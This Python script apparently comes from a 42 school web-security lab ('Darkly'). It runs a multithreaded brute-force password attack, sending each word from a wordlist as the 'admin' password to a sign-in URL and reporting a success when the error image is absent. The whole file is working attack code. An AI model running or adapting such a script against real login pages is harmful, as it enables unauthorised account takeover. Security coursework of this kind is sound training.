# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    login-brute.py                                     :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: rlouvrie <rlouvrie@student.42.fr>          +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/11/28 17:54:09 by rlouvrie          #+#    #+#              #
#    Updated: 2024/11/28 21:40:40 by rlouvrie         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from threading import Lock, Event
from requests import get
from sys import argv, exit


def print_answer(password: str, lock: Lock, stop_event: Event) -> None:
    lock.acquire()
    print(f"Valid password found: {password}")
    stop_event.set()
    lock.release()


def login_request(
    ip: str, username: str, password: str, lock: Lock, stop_event: Event
) -> None:
    if stop_event.is_set():
        return

    url = (
        f"http://{ip}/?page=signin&username={username}&password={password}&Login=Login"
    )

    response = get(url)

    if response.ok and 'src="images/WrongAnswer.gif"' not in response.text:
        print_answer(password, lock, stop_event)


def load_wordlist(filename: str) -> list[str]:
    content = open(filename, "r", encoding="utf-8", errors="ignore").read()
    return content.splitlines()


def multi_threading_brute(ip: str, filename: list) -> None:
    max_workers = 10
    lock = Lock()
    stop_event = Event()
    futures = set()

    with ThreadPoolExecutor(max_workers) as executor:

        for word in load_wordlist(filename):
            if stop_event.is_set():
                exit(0)
            futures.add(
                executor.submit(login_request, ip, "admin", word, lock, stop_event)
            )

            if len(futures) >= max_workers:
                wait(futures, return_when=FIRST_COMPLETED)


if __name__ == "__main__":
    if len(argv) != 3:
        print(f"Usage: ./{argv[0]} <Darkly IP or Domain> <Path to Wordlist>")
        exit(1)
    multi_threading_brute(argv[1], argv[2])
